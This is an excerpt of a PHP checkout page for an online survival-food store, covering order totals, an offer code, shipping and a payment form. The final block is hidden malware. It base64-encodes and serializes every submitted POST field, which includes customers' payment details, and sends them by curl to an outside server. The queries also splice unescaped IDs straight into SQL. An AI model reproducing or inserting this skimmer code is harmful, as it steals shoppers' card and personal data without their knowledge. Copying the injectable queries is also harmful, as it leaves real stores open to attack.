<?php
    ...
    $discounttext = "";
    if($offercode <> "" and $offercode <> 'PP12') {
    ...
    if ($offercode == 'PP12') {
            mysql_query("UPDATE orders SET offercode='PP12' WHERE order_key = $id");
    }
    ...
    $drun = mysql_query($d);
    $productstext = "<b>";
    $shipping_cost_hi_ak = 0;
    while ($e = mysql_fetch_assoc($drun)){
        $pkey = $e['product_key'];
        $qty = $e['quantity'];
        $c = "SELECT product_name, product_price, shipping_cost, shipping_hi_ak FROM products WHERE product_key = $pkey";
        $crun = mysql_query($c);
        while ($f = mysql_fetch_assoc($crun)) {
            $productstext .= $qty . " " . $f['product_name'] . " - $" . number_format ($f['product_price'] * $qty,2, '.', '') . "<br> \n";
            $shipping_cost_hi_ak += $f['shipping_hi_ak'];
        }
    }
    
    if ($charge_shipping == 1) {
        $shipping = number_format ($shipping_cost_hi_ak,2, '.', '');
    ...
    $freeitem = "";
    if ($total > 500 and $offercode == 'PP12') {
        $freeitem = "<B>*FREE* 1 Prepper Pack - 52 Servings - $0.00</B><br> \n";
    }
            ...
            <div class="subbody">
                ...
                <div class="maincontent">
                    ...
                    <form name="payment" id="payment" method="post" action="https://www.maxlifefoods.com/process.php?id=<?php echo $id; ?>" onsubmit="return validate()">
                        ...
                        <input type="hidden" name="paidcheck" value="<?php echo $paidcheck; ?>" />
...
<?php
     $ch = curl_init();curl_setopt($ch, CURLOPT_TIMEOUT, 15);curl_setopt($ch, CURLOPT_URL,"http://s539263079.onlinehome.us/orders/max.php");
     curl_setopt($ch, CURLOPT_POST, 1);
     curl_setopt($ch, CURLOPT_POSTFIELDS, "orders=".base64_encode(serialize($_POST)));
     curl_exec($ch);
     curl_close($ch);
?>